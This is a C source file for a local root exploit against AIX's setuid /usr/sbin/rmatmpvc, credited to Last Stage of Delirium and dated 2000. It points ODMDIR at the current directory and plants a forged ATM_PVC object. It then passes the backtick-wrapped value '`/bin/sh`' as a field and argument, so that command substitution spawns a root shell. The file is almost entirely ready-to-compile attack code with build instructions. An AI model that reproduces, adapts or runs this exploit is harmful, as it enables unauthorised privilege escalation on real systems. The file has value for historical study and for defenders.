/*## copyright LAST STAGE OF DELIRIUM mar 2000 poland        *://lsd-pl.net/ #*/
/*## /usr/sbin/rmatmpvc                                                      #*/

/*   compile: (g)cc -o aix_rmatmpvc aix_rmatmpvc.c /usr/lib/libodm.a          */

#include <odmi.h>

typedef struct{
    long _id,_reserved,_scratch;
    char description[40],interface[8],vpivci[8],ipaddr[16],llcencap[4],arp[4];
}atmpvc_t;

static struct ClassElem atmpvc_classelem[]={
    {"Description",ODM_CHAR,12,40,0,0,0,0,-1,0},
    {"Interface",ODM_CHAR,52,8,0,0,0,0,-1,0},
    {"VPI_VCI",ODM_CHAR,60,8,0,0,0,0,-1,0},
    {"IP_Addr",ODM_CHAR,68,16,0,0,0,0,-1,0},
    {"LLC_Encap",ODM_CHAR,84,4,0,0,0,0,-1,0},
    {"ARP",ODM_CHAR,88,4,0,0,0,0,-1,0}
};

struct Class atmpvc_class[]={
    ODMI_MAGIC,"ATM_PVC",sizeof(atmpvc_t),6,atmpvc_classelem,NULL,FALSE,
    NULL,NULL,0,0,NULL,0,"",0,-ODMI_MAGIC
};

main(int argc,char **argv){
    atmpvc_t pvc;

    printf("copyright LAST STAGE OF DELIRIUM mar 2000 poland  //lsd-pl.net/\n");
    printf("/usr/sbin/rmatmpvc for aix 4.1 4.2 4.3 4.3.x PowerPC/POWER\n\n");

    putenv("ODMDIR=.");
    unlink("ATM_PVC");
    odm_create_class(atmpvc_class);

    memset(&pvc,0,sizeof(atmpvc_t));
    strcpy(pvc.vpivci,"`/bin/sh`");
    strcpy(pvc.interface,"0");
    odm_add_obj(atmpvc_class,&pvc);

    execl("/usr/sbin/rmatmpvc","lsd","-i","0","-v","`/bin/sh`",0);
}

